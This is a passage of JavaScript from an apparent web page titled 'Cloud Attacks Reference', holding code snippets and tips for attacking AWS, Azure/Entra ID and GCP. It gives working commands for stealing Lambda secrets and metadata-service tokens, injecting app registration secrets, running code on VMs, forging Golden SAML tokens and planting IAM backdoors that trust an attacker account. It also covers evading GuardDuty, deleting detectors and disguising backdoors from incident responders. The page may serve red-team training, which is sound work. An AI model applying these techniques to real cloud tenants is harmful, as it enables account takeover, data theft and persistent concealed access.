{t:"Lambda function code and env extraction",l:"aws",c:"# List Lambda functions:\naws lambda list-functions --region us-east-1\n\n# Get function configuration (includes env vars!):\naws lambda get-function-configuration --function-name target-fn\n# Environment.Variables may contain:\n# DB_PASSWORD, API_KEY, SECRET_KEY, etc.\n\n# Download function code:\naws lambda get-function --function-name target-fn\n# Returns: Code.Location = pre-signed S3 URL\n# Download and extract the ZIP\n\n# Get execution role:\naws lambda get-function-configuration --function-name target-fn \\\n    --query 'Role'\n# Then enumerate that role's permissions\naws iam list-attached-role-policies --role-name lambda-role\n\n# Invoke function (if authorized):\naws lambda invoke --function-name target-fn \\\n    --payload '{\"cmd\":\"id\"}' output.json\n\n# Modify function code (persistence):\naws lambda update-function-code --function-name target-fn \\\n    --zip-file fileb://backdoor.zip"}
];
C.eid=[
{t:"Entra ID enumeration with ROADtools",l:"az",c:"# Install ROADtools\npip install roadtools\n\n# Authenticate:\nroadrecon auth -u user@corp.onmicrosoft.com -p password\n# Or with access token:\nroadrecon auth --access-token eyJ0...\n\n# Gather all tenant data:\nroadrecon gather\n# Downloads: users, groups, apps, service principals, roles, etc.\n\n# Launch GUI:\nroadrecon gui\n# Browse at http://localhost:5000\n\n# Key things to look for:\n# - App registrations with high permissions\n# - Service principals with secrets\n# - Users with Global Admin or other privileged roles\n# - Conditional Access policy gaps\n# - Guest users with elevated access\n\n# Alternative: AzureHound (BloodHound for Azure)\n# azurehound -u user@corp.com -p pass -t corp.onmicrosoft.com\n# Import JSON into BloodHound CE"},
{t:"App registration secret injection",l:"az",c:"# Find app registrations we can modify:\naz ad app list --query \"[].{name:displayName, appId:appId, owners:owners}\"\n\n# If we own or have write access to an app:\n# Add new client secret:\naz ad app credential reset --id APP_ID --append\n# Returns: new secret value\n\n# Now authenticate as the application:\naz login --service-principal \\\n    --username APP_ID \\\n    --password NEW_SECRET \\\n    --tenant TENANT_ID\n\n# Check app's permissions:\naz ad app permission list --id APP_ID\n# Application permissions (not delegated) don't need user consent\n# Examples: Mail.ReadWrite.All, User.ReadWrite.All, Directory.ReadWrite.All\n\n# Use Graph API with app permissions:\naz rest --method GET \\\n    --url 'https://graph.microsoft.com/v1.0/users' \\\n    --headers 'Content-Type=application/json'\n\n# Read any user's email:\naz rest --method GET \\\n    --url 'https://graph.microsoft.com/v1.0/users/TARGET/messages'"}
];
C.azs=[
{t:"Azure VM command execution",l:"az",c:"# Run command on VM (requires Contributor or VM Contributor):\naz vm run-command invoke \\\n    --resource-group RG_NAME \\\n    --name VM_NAME \\\n    --command-id RunPowerShellScript \\\n    --scripts 'whoami; hostname; ipconfig'\n\n# Or RunShellScript for Linux:\naz vm run-command invoke \\\n    --resource-group RG_NAME \\\n    --name VM_NAME \\\n    --command-id RunShellScript \\\n    --scripts 'id; hostname; cat /etc/passwd'\n\n# Custom Script Extension (more persistent):\naz vm extension set \\\n    --resource-group RG_NAME \\\n    --vm-name VM_NAME \\\n    --name CustomScriptExtension \\\n    --publisher Microsoft.Compute \\\n    --settings '{\"commandToExecute\":\"powershell -c IEX(...)\"}'\n\n# List VMs:\naz vm list --query '[].{name:name, rg:resourceGroup}' -o table\n\n# Get managed identity token from within VM:\ncurl -H 'Metadata: true' \\\n    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"}
];
C.gcp=[
{t:"GCP metadata and service account tokens",l:"gcp",c:"# Get access token from metadata (within GCP instance):\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'\n# Returns: {\"access_token\":\"ya29...\",\"expires_in\":3600,...}\n\n# Get service account email:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'\n\n# Get project ID:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/project/project-id'\n\n# Custom metadata (may contain secrets):\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/instance/attributes/'\n\n# Project-wide SSH keys:\ncurl -H 'Metadata-Flavor: Google' \\\n    'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys'\n\n# Use token:\ncurl -H \"Authorization: Bearer ya29...\" \\\n    'https://www.googleapis.com/storage/v1/b?project=PROJECT_ID'"}
];
C.fed=[
{t:"Golden SAML with AADInternals",l:"ps",c:"# Golden SAML: forge SAML tokens after stealing signing cert\n# Requires: ADFS token-signing certificate\n\n# Export ADFS signing certificate (from ADFS server):\nExport-AADIntADFSSigningCertificate\n\n# Or extract from AD (DKM key in ADFS container):\n# mimikatz: token::elevate -> lsadump::secrets\n\n# Forge SAML token for any user:\n$cert = Import-Certificate -FilePath .\\signing.pfx\nNew-AADIntSAMLToken -ImmutableID 'USER_IMMUTABLE_ID' \\\n    -Issuer 'http://adfs.corp.com/adfs/services/trust' \\\n    -Certificate $cert \\\n    -PfxFileName .\\signing.pfx\n\n# Use forged token to access Azure/M365:\nOpen-AADIntOffice365Portal -SAMLToken $token\n\n# Or get access token:\n$at = Get-AADIntAccessTokenWithSAML -SAMLToken $token \\\n    -Resource https://graph.microsoft.com\n\n# This bypasses MFA (SAML assertion is post-authentication)\n# Valid until signing certificate is rotated"}
];
C.per=[
{t:"AWS IAM backdoor techniques",l:"aws",c:"# Method 1: New access key on existing user\naws iam create-access-key --user-name existing-admin\n# Save the AccessKeyId + SecretAccessKey\n\n# Method 2: Backdoor role trust policy\naws iam update-assume-role-policy --role-name admin-role \\\n    --policy-document '{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[{\n        \"Effect\":\"Allow\",\n        \"Principal\":{\"AWS\":\"arn:aws:iam::ATTACKER_ACCOUNT:root\"},\n        \"Action\":\"sts:AssumeRole\"\n    }]}'\n# Now attacker account can assume this role anytime\n\n# Method 3: Lambda with CloudWatch trigger\n# Deploy Lambda that re-creates your access if deleted\n# Triggered by CloudTrail event: DeleteAccessKey\n\n# Method 4: Hidden IAM user\naws iam create-user --user-name ServiceAccount-Backup-0x8f2a\naws iam attach-user-policy --user-name ServiceAccount-Backup-0x8f2a \\\n    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name ServiceAccount-Backup-0x8f2a\n\n# Method 5: SSM document for persistent access\n# Create document that calls back to C2\n# Associate with EC2 instances for persistent shell"}
];
C.kit=[
{t:"Cloud enumeration quick-start",l:"bash",c:"# === AWS ===\naws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws s3 ls\naws ec2 describe-instances --region us-east-1\naws lambda list-functions --region us-east-1\naws secretsmanager list-secrets --region us-east-1\n\n# === Azure ===\naz account show\naz account list\naz ad user list\naz ad app list\naz vm list\naz storage account list\naz keyvault list\n\n# === GCP ===\ngcloud config list\ngcloud projects list\ngcloud iam service-accounts list\ngsutil ls\ngcloud compute instances list\ngcloud functions list\ngcloud secrets list\n\n# === Multi-cloud tools ===\n# ScoutSuite (audit):\nscout --provider aws --profile stolen\nscout --provider azure --cli\nscout --provider gcp --service-account key.json\n\n# Cloudfox (attack surface):\ncloudfox aws all-checks --profile stolen\ncloudfox azure all-checks"}
];
C.byp=[
{t:"GuardDuty evasion techniques",l:"aws",c:"# GuardDuty detects:\n# - API calls from known bad IPs (Tor, VPN)\n# - Credential use from unusual geographies\n# - Reconnaissance API calls (ListUsers, etc.)\n# - Crypto mining behavior\n# - DNS-based data exfiltration\n\n# Evasion strategies:\n\n# 1. Use stolen creds from same region as victim\n#    (avoids geo-anomaly detection)\n\n# 2. Use an EC2 instance within the VPC for recon\n#    (internal traffic not flagged by some findings)\n\n# 3. Slow enumeration (avoid rate-based detections)\n#    Add sleep between API calls\n\n# 4. Use existing IAM entities, don't create new ones\n#    New user creation triggers alerts\n\n# 5. Avoid known GuardDuty finding patterns:\n#    - Don't use Tor/known VPN exit IPs\n#    - Don't call rarely-used APIs in rapid succession\n#    - Don't access metadata from unusual processes\n\n# 6. If you have admin access (nuclear option):\naws guardduty delete-detector --detector-id DETECTOR_ID\n# Extremely noisy, last resort only"}
];
return C[s]||[];
}
var TR={
aim:[
{t:"enumerate-iam before anything else",d:"Stolen AWS keys? Run enumerate-iam.py immediately. It brute-forces every API call to map your exact permissions. Don't guess what you can do."},
{t:"IAM has ~20 privesc paths",d:"Rhino Security documented 20+ IAM privilege escalation methods. CreatePolicyVersion, AttachUserPolicy, PutRolePolicy, PassRole+Lambda, etc. Pacu automates detection."},
{t:"Access keys never expire by default",d:"Unlike STS temp creds, IAM access keys live forever unless rotated. One leaked key = persistent access until discovered. Check GitHub, .env files, CI/CD logs."},
{t:"Role chaining can cross accounts",d:"AssumeRole can target roles in other AWS accounts if the trust policy allows it. One compromised account may lead to the entire organization."}
],
aws:[
{t:"SSRF to metadata = full account compromise",d:"Any SSRF vulnerability on an EC2 instance with an IAM role can steal temporary credentials from the metadata service. IMDSv2 mitigates simple GETs but not all SSRF."},
{t:"User-data scripts contain secrets",d:"EC2 user-data (startup scripts) often hardcode passwords, API keys, and bootstrap tokens. Readable from metadata: curl .../latest/user-data. Check every instance."},
{t:"Terraform state files are gold",d:"terraform.tfstate in S3 contains every resource output including secrets, passwords, and connection strings. Often in a bucket with overly permissive access."},
{t:"Lambda environment variables leak secrets",d:"get-function-configuration returns environment variables in cleartext. DB passwords, API keys, encryption keys commonly stored here. Check every Lambda."}
],
eid:[
{t:"App registrations are the AD equivalent of service accounts",d:"Over-permissioned app registrations with client secrets are everywhere. Mail.ReadWrite.All, User.ReadWrite.All, Directory.ReadWrite.All = tenant admin equivalent."},
{t:"Global Admin can elevate to Azure subscription Owner",d:"Entra Global Admin doesn't automatically have Azure access. But one toggle in the Portal gives User Access Administrator at root scope = Owner on everything."},
{t:"PRT is the cloud equivalent of a Kerberos TGT",d:"Primary Refresh Tokens on hybrid-joined devices enable SSO to all Azure/M365 services. Extract with Mimikatz or ROADtoken for persistent cloud access."},
{t:"Managed Identity tokens from metadata",d:"Same 169.254.169.254 concept as AWS. Any code execution on an Azure VM/Function with managed identity gives you an access token. No credentials needed."}
],
azs:[
{t:"Run Command = remote code execution",d:"az vm run-command invoke is RCE-as-a-service. Contributor role on a resource group with VMs = code execution on every VM. Often overlooked in access reviews."},
{t:"ARM template parameters store secrets",d:"Deployment history retains template parameters including passwords. secureString is supposed to protect them, but deployment outputs and linked templates may leak."},
{t:"Key Vault access policies are separate from RBAC",d:"A user might have no Azure RBAC permissions but still be in a Key Vault access policy. Always check both access control mechanisms."},
{t:"Storage account keys = full access",d:"Two storage account keys provide unlimited access to all containers and blobs. No audit trail per-operation. Rotate immediately if leaked."}
],
gcp:[
{t:"Default service accounts are overly permissive",d:"The default compute service account has Project Editor role. Any code execution on a default GCP VM = near-admin access to the entire project."},
{t:"Service account keys never expire",d:"JSON key files are valid forever unless explicitly deleted. One leaked key = persistent access. Check source code repos and CI/CD systems."},
{t:"Project-wide SSH keys in metadata",d:"GCP allows SSH keys in project metadata that grant access to ALL instances in the project. One metadata write = SSH to every VM."},
{t:"iam.serviceAccounts.getAccessToken is god-mode",d:"This permission lets you generate an access token for ANY service account in the project. Equivalent to having every service account's credentials."}
],
fed:[
{t:"Golden SAML persists until cert rotation",d:"ADFS token-signing certificates are rarely rotated. Once stolen, you can forge SAML tokens indefinitely. This was the SolarWinds technique."},
{t:"OIDC federation trusts are often too broad",d:"GitHub Actions OIDC to AWS may trust 'repo:org/*' instead of a specific repo. Any repo in the org can assume the AWS role."},
{t:"Tokens are usually not IP-bound",d:"Cloud access tokens (AWS STS, Azure JWT, GCP OAuth) work from any IP by default. Steal a token and use it from your own infrastructure."},
{t:"On-prem compromise often leads to cloud",d:"Azure AD Connect sync accounts, ADFS signing certs, and hybrid-joined device PRTs all bridge from on-prem AD to cloud. Compromise AD = compromise cloud."}
],
per:[
{t:"Modify existing resources over creating new",d:"Creating a new IAM user or role triggers alerts. Adding a key to an existing user or adding a trust to an existing role is much harder to detect."},
{t:"Event-triggered self-healing persistence",d:"Lambda triggered by CloudTrail DeleteAccessKey event that re-creates your access. Cleanup efforts automatically trigger re-compromise."},
{t:"Azure federated credentials need no secret",d:"Federated credentials on app registrations allow authentication without client secrets. Harder to detect because there's no secret to find or rotate."},
{t:"Tag resources to blend with environment",d:"Name your backdoor resources to match existing patterns. ServiceAccount-Backup, lambda-monitoring-prod, etc. Make IR teams scroll past them."}
],
kit:[
{t:"Start with sts get-caller-identity",d:"Always verify who you are first. The identity, account, and ARN tell you exactly what you're working with. Then enumerate permissions methodically."},
{t:"ScoutSuite gives a security posture overview",d:"Run ScoutSuite early for a bird's-eye view of misconfigurations. It checks CIS benchmarks and highlights the worst findings. Great for target prioritization."},
{t:"Cloudfox maps attack surface automatically",d:"Cloudfox specifically looks for offensive paths: assumable roles, exposed secrets, overpermissioned Lambda, public S3, etc. Complements ScoutSuite."},
{t:"ROADtools is essential for Azure tenants",d:"roadrecon gather + gui gives you a full searchable dump of the Entra ID tenant. App permissions, role assignments, conditional access gaps, everything."}
],
byp:[
{t:"CloudTrail doesn't log everything",d:"S3 data events (GetObject) require explicit configuration. Many accounts only log management events. Your S3 exfil may not appear in logs at all."},
{t:"GuardDuty is geography-aware",d:"Using stolen creds from a different continent triggers findings. Operate from the same region as the victim. Use an EC2 instance within their VPC if possible."},
{t:"Sentinel has coverage gaps based on cost",d:"Azure Sentinel ingests logs that cost money. Many orgs skip expensive log sources. Function App logs, Storage Analytics, and detailed Graph audit may not be collected."},
{t:"SCP bypass via management account",d:"Service Control Policies don't apply to the management account. If you compromise the org management account, SCPs are irrelevant. This is by design."}
]
};
function render(){
var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
var codes=getCodes(S.s),tricks=TR[S.s]||[];
var flow='';
if(S.s==='aim')flow=fAIM();else if(S.s==='aws')flow=fAWS();else if(S.s==='eid')flow=fEID();
else if(S.s==='azs')flow=fAZS();else if(S.s==='gcp')flow=fGCP();else if(S.s==='fed')flow=fFED();
else if(S.s==='per')flow=fPER();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
var thtml=tricks.length===0?'':
'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT / EVASION</div>'+
tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
$('#app').innerHTML=
'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Cloud Attacks Reference</h1><div class="sub">AWS IAM \u2022 AWS Services \u2022 Azure/Entra \u2022 Azure Services \u2022 GCP \u2022 Multi-Cloud \u2022 Persistence \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
'<div class="ft">'+[{c:"#f59e0b",l:"AWS IAM"},{c:"#f87171",l:"AWS Services"},{c:"#60a5fa",l:"Azure/Entra"},{c:"#a78bfa",l:"Azure Svc"},{c:"#34d399",l:"GCP"},{c:"#e879f9",l:"Multi-Cloud"},{c:"#fbbf24",l:"Persistence"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
$$('.cp').forEach(function(p){
p.querySelector('.ct2').onclick=function(){
var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
if(ex){ex.remove();cv.classList.remove('op');return}
cv.classList.add('op');
var ci=parseInt(p.dataset.ci),c=codes[ci];
var pre=document.createElement('pre');pre.className='cb mono';
pre.innerHTML=c.c.split('\n').map(function(line){
var ci2=line.indexOf('//');
if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
return esc(line);
}).join('\n');
p.appendChild(pre);};
});
$$('.ti').forEach(function(p){
p.querySelector('.tt').onclick=function(){
var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
p.classList.add('op');cv.classList.add('op');
var ti=parseInt(p.dataset.ti);
var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
p.appendChild(div);};
});
}
render();
</script>
</body>
</html>
